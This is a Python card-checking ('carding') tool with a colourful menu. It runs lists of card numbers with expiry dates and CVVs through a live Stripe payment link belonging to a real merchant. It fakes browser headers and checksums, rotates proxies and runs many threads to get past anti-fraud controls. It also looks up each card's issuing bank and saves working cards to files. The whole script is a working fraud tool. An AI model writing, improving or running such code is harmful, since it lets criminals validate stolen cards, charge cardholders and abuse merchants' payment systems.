import requests
import sys
import os
import time
import concurrent.futures
import threading
import random
import uuid
import re
import string
import urllib.parse

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')

RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
PURPLE = '\033[1;35m'
CYAN = '\033[1;36m'
RESET = '\033[0m'

CARD_ICON = '⊀ 𝐂𝐚𝐫𝐝 ↬'
GATE_ICON = '⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬'
STATUS_ICON = '⊀ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬'
RESP_ICON = '⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬'
BRAND_ICON = '⊀ 𝐁𝐫𝐚𝐧𝐝 ↬'
BANK_ICON = '⊀ 𝐁𝐚𝐧𝐤 ↬'
COUNTRY_ICON = '⊀ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↬'
DEV_ICON = '⌬ 𝐃𝐞𝐯 ↬'

STATUS_FONTS = {
    "CHARGED": "𝐂𝐇𝐀𝐑𝐆𝐄𝐃",
    "APPROVED": "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃",
    "DECLINED": "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃",
    "ERROR": "𝐄𝐑𝐑𝐎𝐑"
}

STATUS_EMOJI = {
    "CHARGED": "🔥",
    "APPROVED": "✅",
}

BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
PAYMENT_LINK_ID = BUY_URL.rstrip("/").split("/")[-1]
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"

print_lock = threading.Lock()
stats = {"charged": 0, "approved": 0, "declined": 0, "error": 0}

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    try:
        clear()
        print(f"{BLUE}")
        print("      ███████╗████████╗██████╗ ██╗██████╗ ███████╗")
        print("     ██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██╔════╝")
        print("     ███████╗   ██║   ██████╔╝██║██████╔╝█████╗  ")
        print("     ╚════██║   ██║   ██╔══██╗██║██╔═══╝ ██╔══╝  ")
        print("     ███████║   ██║   ██║  ██║██║██║     ███████╗")
        print("     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝")
        print(f"          {CYAN}Created by {GREEN}@Xoarch {RESET}| {RED}@ScriptDung{RESET}\n")
    except UnicodeEncodeError:
        pass

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            brand = data.get('brand', 'UNKNOWN')
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            flag = data.get('country_flag', '')
            return brand, bank, country, flag
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", ""

proxies_list = []

def get_random_proxy():
    return None

def format_proxy(p, p_type="http"):
    if not p: return None
    p = p.strip()
    if "://" in p: p = p.split("://")[-1]
    if p_type == "https": p_type = "http"
    pre = "socks4://" if p_type == "socks4" else ("socks5://" if p_type == "socks5" else "http://")
    if "@" in p: return f"{pre}{p}"
    parts = p.split(':')
    if len(parts) == 2:
        return f"{pre}{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        if parts[1].isdigit() and len(parts[1]) <= 5:
            return f"{pre}{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return f"{pre}{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    return f"{pre}{p}"

def generate_random_email():
    digits = ''.join(random.choices(string.digits, k=8))
    return f"Xoarch{digits}@gmail.com"

def decline_message(code, default_msg):
    mapping = {
        "incorrect_cvc": "Your security code is incorrect",
        "incorrect_number": "Your card number is incorrect.",
        "insufficient_funds": "Your card has insufficient funds.",
    }
    return mapping.get(code, "Your card was declined.")

def _rand_id(k=32):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def check_cc(cc_full, proxy=None, proxy_type="http"):
    session = requests.Session()
    if proxy:
        formatted_proxy = format_proxy(proxy, proxy_type)
        session.proxies = {"http": formatted_proxy, "https": formatted_proxy}
    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
        if len(yy) == 4: yy = yy[-2:]
        name = data_parts[4].strip() if len(data_parts) > 4 else "Card Holder"
    except:
        return "ERROR", "Invalid format", "UNKNOWN"

    email = generate_random_email()
    card = {
        "number": cc, "cvc": cvv, "exp_month": mm, "exp_year": yy,
        "name": name, "email": email
    }

    try:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none", "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": USER_AGENT,
        }
        resp = session.get(BUY_URL, headers=headers)
        html = resp.text

        pk_live = None
        m = re.search(r"pk_live_[A-Za-z0-9]+", html)
        if m: pk_live = m.group(0)
        cs_id = None
        m = re.search(r"cs_live_[A-Za-z0-9]+", html)
        if m: cs_id = m.group(0)

        merchant_ui_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        payment_link_form = {
            "eid": "NA", "browser_locale": "vi",
            "browser_timezone": "Asia/Saigon",
            "referrer_origin": "https://karibuwomenhome.com.au",
        }
        pl_resp = session.post(
            f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
            headers=merchant_ui_headers, data=urllib.parse.urlencode(payment_link_form),
        )
        checkout_session_id = cs_id
        pl_data = {}
        pl_expected_amount = None
        pl_config_id = None
        pl_currency = "aud"
        if pl_resp.ok:
            try:
                pl_data = pl_resp.json()
                checkout_session_id = pl_data.get("session_id") or checkout_session_id
                pl_config_id = pl_data.get("config_id")
                pl_currency = pl_data.get("currency") or "aud"
                lig = pl_data.get("line_item_group") or {}
                pl_expected_amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
                if pl_expected_amount is not None:
                    pl_expected_amount = int(pl_expected_amount)
            except:
                pass

        if not pk_live:
            pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
        if not checkout_session_id:
            checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"

        muid = "bf10e066-3dde-43cf-990c-7f526e267148"
        guid = "598209cc-46fa-4e08-b69c-22b3316aba05"
        sid = "4318288f-e6f2-4e62-bc88-4d5ccc435a1b"
        stripe_js_id = str(uuid.uuid4())
        currency = pl_currency

        api_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com", "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }

        elements_sessions_params = {
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(pl_expected_amount) if pl_expected_amount else "100",
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[payment_method_types][1]": "link",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency, "key": pk_live,
            "elements_init_source": "payment_link", "hosted_surface": "checkout",
            "referrer_host": "buy.stripe.com", "stripe_js_id": stripe_js_id,
            "locale": "vi", "type": "deferred_intent",
            "checkout_session_id": checkout_session_id,
        }
        response_es = session.get(
            "https://api.stripe.com/v1/elements/sessions",
            params=elements_sessions_params, headers=api_headers,
        )
        es_data = response_es.json()
        expected_amount_cents = pl_expected_amount
        if expected_amount_cents is None:
            sess = es_data.get("session") or es_data
            expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
        if expected_amount_cents is None:
            expected_amount_cents = 100
        expected_amount_cents = int(expected_amount_cents)
        expected_amount_str = str(expected_amount_cents)

        buy_headers = {**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}

        form_pm = {
            "type": "card",
            "card[number]": cc, "card[cvc]": cvv,
            "card[exp_month]": mm, "card[exp_year]": yy,
            "billing_details[name]": name, "billing_details[email]": email,
            "billing_details[address][country]": "VN",
            "guid": guid, "muid": muid, "sid": sid, "key": pk_live,
            "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        response_pm = session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=buy_headers, data=urllib.parse.urlencode(form_pm),
        )
        pm_resp = response_pm.json()
        if pm_resp.get("error"):
            err_code = pm_resp["error"].get("code", "")
            err_msg = pm_resp["error"].get("message", "Your card was declined.")
            if err_code == "insufficient_funds":
                return "APPROVED", decline_message(err_code, err_msg), "UNKNOWN"
            return "DECLINED", decline_message(err_code, err_msg), "UNKNOWN"
        pm_id = pm_resp.get("id")
        if not pm_id:
            return "ERROR", "Failed to create PaymentMethod", "UNKNOWN"

        init_checksum = _rand_id(32)
        js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
        pxvid = str(uuid.uuid4())
        rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))

        confirm_form = {
            "eid": "NA", "payment_method": pm_id,
            "expected_amount": expected_amount_str,
            "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
            "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_discount_amount]": "0",
            "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
            "expected_payment_method_type": "card",
            "guid": guid, "muid": muid, "sid": sid, "key": pk_live,
            "version": "148043f9d7", "init_checksum": init_checksum,
            "js_checksum": js_checksum, "pxvid": pxvid,
            "passive_captcha_token": "",
            "passive_captcha_ekey": pl_data.get("site_key", ""),
            "rv_timestamp": rv_timestamp,
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        confirm_resp = session.post(
            f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
            headers=buy_headers, data=urllib.parse.urlencode(confirm_form, safe=""),
        )
        data = confirm_resp.json()

        brand = data.get("payment_method", {}).get("card", {}).get("brand", "UNKNOWN")

        if confirm_resp.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            return "APPROVED", "3DS Required", brand

        err = data.get("error") or {}
        if err:
            err_code = err.get("code", "")
            message = err.get("message", "Your card was declined.")
            if err.get("charge") and ("succeeded" in str(data.get("status", "")).lower()):
                return "CHARGED", "Your card was charged.", brand
            if err_code == "insufficient_funds":
                return "APPROVED", decline_message(err_code, message), brand
            return "DECLINED", decline_message(err_code, message), brand

        if data.get("status") in ("succeeded", "complete"):
            return "CHARGED", "Your card was charged.", brand

        return "DECLINED", "Unknown response", brand
    except requests.exceptions.RequestException:
        return "ERROR", "Request failed", "UNKNOWN"
    except:
        return "ERROR", "Gateway Error", "UNKNOWN"

def build_block(cc_line, status, response, brand, bank, country, flag, use_color=True):
    st_font = STATUS_FONTS.get(status, status)
    emoji = STATUS_EMOJI.get(status, "")
    P = PURPLE if use_color else ""
    R = RESET if use_color else ""
    return (
        f"  {P}───────────────────────────────────────{R}\n"
        f"  {CARD_ICON} {cc_line}\n"
        f"  {GATE_ICON} 𝗦𝘁𝗿𝗶𝗽𝗲 $𝟭\n"
        f"  {STATUS_ICON} {st_font} {emoji}\n"
        f"  {RESP_ICON} {response}\n"
        f"  {BRAND_ICON} {brand}\n"
        f"  {BANK_ICON} {bank}\n"
        f"  {COUNTRY_ICON} {country} {flag}\n"
        f"  {DEV_ICON} @Xoarch\n"
        f"  {P}───────────────────────────────────────{R}"
    )

def save_result(block, status):
    filename = f"{status.lower()}.txt"
    with open(filename, "a", encoding="utf-8") as f:
        f.write(block + "\n\n")

def worker(cc_line, use_proxy=False, proxy_type="http"):
    status, response, brand_auto = "ERROR", "Initial", "UNKNOWN"
    for attempt in range(3):
        proxy = random.choice(proxies_list) if use_proxy and proxies_list else None
        status, response, brand_auto = check_cc(cc_line, proxy=proxy, proxy_type=proxy_type)
        if status != "ERROR":
            break
        time.sleep(2)
    bin_code = cc_line[:6]
    brand_bin, bank, country, flag = get_bin_info(bin_code)
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
    emoji = STATUS_EMOJI.get(status, "")
    color = RED
    if status == "CHARGED":
        color = GREEN
        stats["charged"] += 1
    elif status == "APPROVED":
        color = GREEN
        stats["approved"] += 1
    elif status == "ERROR":
        color = PURPLE
        stats["error"] += 1
    else:
        stats["declined"] += 1
    st_font = STATUS_FONTS.get(status, status)
    with print_lock:
        if emoji:
            print(f"{color}{cc_line} - {st_font} {emoji}{RESET}")
        else:
            print(f"{color}{cc_line} - {st_font}{RESET}")
        if status in ["CHARGED", "APPROVED"]:
            display_block = build_block(cc_line, status, response, brand, bank, country, flag, use_color=True)
            save_block = build_block(cc_line, status, response, brand, bank, country, flag, use_color=False)
            save_result(save_block, status)
    time.sleep(random.randint(2, 5))

def main():
    global proxies_list
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r") as f:
            proxies_list = [line.strip() for line in f if line.strip()]
    while True:
        banner()
        if proxies_list:
            print(f"    {GREEN}PROXIES LOADED: {len(proxies_list)}{RESET}")
        print(f"    {BLUE}[1] SINGLE MODE")
        print(f"    [2] MASS MODE")
        print(f"    [3] EXIT{RESET}")
        choice = input(f"\n{YELLOW}Select Mode: {RESET}")
        if choice == '1':
            cc_input_val = input(f"{YELLOW}Enter your cc (format: cc|mm|yy|cvv): {RESET}").strip()
            if not cc_input_val: continue
            print(f"{BLUE}Checking...{RESET}")
            status, response, brand_auto = check_cc(cc_input_val)
            if status == "ERROR":
                print(f"{RED}Error: {response}{RESET}")
                input("\nPress enter to continue...")
                continue
            bin_code = cc_input_val[:6]
            brand_bin, bank, country, flag = get_bin_info(bin_code)
            brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
            color = RED
            if status == "CHARGED": color = GREEN
            elif status == "APPROVED": color = GREEN
            block = build_block(cc_input_val, status, response, brand, bank, country, flag, use_color=True)
            print(f"\n{color}{block}{RESET}")
            if status in ["CHARGED", "APPROVED"]:
                save_block = build_block(cc_input_val, status, response, brand, bank, country, flag, use_color=False)
                save_result(save_block, status)
            input(f"\n{YELLOW}Press enter to go back...{RESET}")
        elif choice == '2':
            file_path = input(f"{YELLOW}Enter your cc file: {RESET}").strip()
            if not os.path.exists(file_path):
                print(f"{RED}File not found! {file_path}{RESET}")
                time.sleep(2)
                continue
            print(f"\n{BLUE}[1] HTTP\n[2] HTTPS\n[3] SOCKS4\n[4] SOCKS5\n[5] PROXYLESS{RESET}")
            p_type_idx = input(f"{YELLOW}Enter proxy type: {RESET}").strip()
            use_prx = False
            p_type = "http"
            if p_type_idx in ['1', '2', '3', '4']:
                p_file = input(f"{YELLOW}Enter your proxy file: {RESET}").strip()
                if os.path.exists(p_file):
                    with open(p_file, "r") as f:
                        proxies_list = [line.strip() for line in f if line.strip()]
                    use_prx = True
                    if p_type_idx == '2': p_type = "https"
                    elif p_type_idx == '3': p_type = "socks4"
                    elif p_type_idx == '4': p_type = "socks5"
                    print(f"{GREEN}Loaded {len(proxies_list)} proxies.{RESET}")
                else:
                    print(f"{RED}Proxy file not found! Going proxyless.{RESET}")
                    time.sleep(1)
            try:
                threads_input = input(f"{YELLOW}Enter thread count (default 5): {RESET}").strip()
                threads = int(threads_input) if threads_input else 5
            except ValueError: threads = 5
            banner()
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    ccs = [line.strip() for line in f if line.strip()]
            except UnicodeDecodeError:
                with open(file_path, "r", encoding="cp1252") as f:
                    ccs = [line.strip() for line in f if line.strip()]
            stats["charged"] = 0
            stats["approved"] = 0
            stats["declined"] = 0
            stats["error"] = 0
            from functools import partial
            worker_with_args = partial(worker, use_proxy=use_prx, proxy_type=p_type)
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(worker_with_args, ccs)
            print(f"\n{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"   {GREEN}𝐂𝐇𝐀𝐑𝐆𝐄𝐃 🔥: {stats['charged']}{RESET}")
            print(f"   {GREEN}𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅: {stats['approved']}{RESET}")
            print(f"   {RED}𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃: {stats['declined']}{RESET}")
            print(f"   {PURPLE}𝐄𝐑𝐑𝐎𝐑𝐒   : {stats['error']}{RESET}")
            print(f"{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"{CYAN}Check completed successfully! Detailed results saved.{RESET}")
            input(f"\n{YELLOW}Press enter to go back...{RESET}")
        elif choice == '3':
            print(f"{PURPLE}Exiting...{RESET}")
            break
        else:
            print(f"{RED}Invalid Choice!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
